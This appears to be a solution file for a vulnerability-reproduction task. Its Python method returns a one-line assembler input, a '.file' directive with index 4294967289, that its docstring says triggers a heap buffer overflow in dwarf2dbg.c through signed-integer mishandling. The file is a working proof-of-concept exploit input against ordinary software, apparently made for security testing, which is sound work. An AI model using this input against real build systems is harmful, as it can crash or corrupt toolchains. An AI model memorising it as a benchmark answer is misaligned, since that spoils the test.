import sys

class Solution:
    def solve(self, src_path: str) -> bytes:
        """
        Generate a PoC that triggers the heap buffer overflow in dwarf2dbg.c.
        The vulnerability is triggered by a large file index in the .file directive,
        specifically 4294967289 (0xFFFFFFF9), which is mishandled as a signed integer.
        """
        return b'.file 4294967289 "x"\n'
